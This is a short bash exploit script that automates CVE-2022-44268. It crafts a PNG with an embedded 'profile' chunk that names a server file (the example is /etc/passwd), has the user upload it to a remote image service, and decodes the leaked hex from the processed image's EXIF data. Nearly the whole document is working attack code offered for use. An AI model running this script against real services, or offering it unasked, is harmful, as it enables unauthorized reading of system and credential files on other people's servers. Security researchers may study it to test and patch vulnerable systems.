#!/bin/bash

# Automating exploitation of CVE-2022-44268
# narekkay @0xNarek

BRed='\033[1;31m'
BGreen='\033[1;32m'
BPurple='\033[1;35m'
NC='\033[0m' # No Color

if [[ $# != 2 ]]; then
	echo "[i] Missing arguments."
	echo "Usage: ./exploit image.png /etc/passwd"
	exit
fi

echo -e "\n[+] Backdooring: ${BGreen}$1${NC} => reading ${BGreen}$2${NC}"
pngcrush -text a "profile" "$2" $1 backdoored.png

echo -e "\n"

echo -e "${BGreen}[+] GENERATED backdoored.png,${NC} checking validity:"
exiv2 -pS backdoored.png

echo -e "\n"

cr=`echo $'\n.'`
cr=${cr%.}

echo -e "${BGreen}[+] ACTION REQUIRED : UPLOAD ${BPurple}backdoored.png${NC} to the remote service, and ${BGreen}DOWNLOAD${NC} AS ${BPurple}final.png${NC}"
read -p "Press Enter when done...$cr$cr"
# or you could convert locally like this: convert backdoored.png final.png

# identify -verbose final.png

# get exif field "Raw Profile Type"
exiftool final.png -RawProfileType > .tmp_1111

# exit if null
if [[ $(stat -c%s .tmp_1111) -eq 0 ]]; then
	echo -e "\n[+] ${BRed}$2 not found !${NC}"
	exit
fi

echo -e "\n[${BGreen}+] Fetching HEX data from EXIF field \"Raw Profile Type\"...${NC}"

# delete the double dots
sed -i 's/\.\.//g' .tmp_1111

# get eveything after the first dot
cut -d"." -f2- .tmp_1111 > .tmp_2222

# remove all dots
sed -i 's/\.//g' .tmp_2222

echo -e "${BGreen}[+] HEX Found !\n${NC}$(cat .tmp_2222)\n"

# convert hex to ascii
ascii=$(xxd -r -p .tmp_2222)
echo -e "${BGreen}[+] $2${NC}\n${ascii}\n"

# clean up
rm .tmp_1111 .tmp_2222

# python3 -c 'print(bytes.fromhex("68656c6c6f0a").decode("utf-8"))'
# or in python
